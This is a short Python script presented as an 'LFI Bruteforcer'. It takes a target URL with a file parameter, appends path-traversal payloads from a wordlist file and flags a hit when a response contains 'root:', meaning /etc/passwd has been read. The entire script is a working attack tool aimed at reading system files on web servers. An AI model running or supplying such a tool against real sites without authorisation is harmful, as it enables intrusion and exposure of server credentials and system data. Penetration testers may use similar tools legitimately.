import requests, sys, os

try:
	CGR = '\33[34m'
	CEN = '\33[0m'
	CRE = '\33[91m'
	CHE = '\33[92m'
	CYL = '\33[93m'
	wordlist = "lfi.txt"

	os.system("cls")
	print(CGR+"""_  _ ____ _  _ ___ ____ ____ ____ _ ___ 
|\/| |__|  \/   |  |___ |__/ |  | |  |  
|  | |  | _/\_  |  |___ |  \ |__| |  |  
                                        
"""+CEN)
	print("======================================================================")
	print(CRE+"LFI Bruteforcer"+CEN)
	print("======================================================================")
	print(CRE+" Coder    : Adittya (Founder Maxteroit)"+CEN)
	print(CRE+" Github   : https://github.com/maxteroit"+CEN)
	print(CRE+" Website  : https://maxteroit.com"+CEN)
	print(CRE+" Email    : adittya@maxteroit.com"+CEN)
	print("======================================================================")
	target = input("URL TARGET [Ex : "+CGR+"http://maxteroit.com/preview.php?file="+CEN+" ] : ")
	print("======================================================================")

	def brute(url):
		try:
			return requests.get(url)
		except KeyboardInterrupt:
			print("Program Terminated")
			sys.exit(0)

	with open(wordlist, "r") as word :
		for line in word:
			payload = line.strip()
			target_url = target+payload
			response = brute(target_url)
			if b"root:" in response.content:
				print("LFI Found ! >>> "+CGR+target_url+CEN)
		print("Finished")
except KeyboardInterrupt:
			print("Program Terminated")
			sys.exit(0)